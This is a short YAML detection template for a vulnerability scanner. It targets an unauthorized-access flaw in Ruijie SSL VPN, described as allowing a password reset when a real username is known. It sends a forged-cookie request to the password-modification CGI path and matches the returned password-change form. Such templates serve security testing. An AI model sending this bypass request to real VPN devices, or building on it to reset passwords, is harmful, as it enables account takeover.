name: poc-yaml-ruijievpn-unauthorized
binding: cd6ce433-a345-4a55-a4be-4b1407543fe0
manual: true
detail:
    author: Xz
    links:
        - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/wgfxyr
    vulnerability:
        id: CT-528591
        level: high
    description: 锐捷 SSL VPN 越权访问漏洞，在得知真实用户名后可进行密码重置操作
transport: http
set:
    r1: randomLowercase(25)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi-bin/main.cgi?oper=modpwd
            headers:
                Cookie: UserName={{r1}}; SessionId=1614345312; Skin=1; tunnel=1
        expression: response.status == 200 && response.body.bcontains(b"value='attsso'") && response.body.bcontains(b"name='ssoname'") && response.body.bcontains(b"type='password' name='ssopwd1' id")
expression: r0()
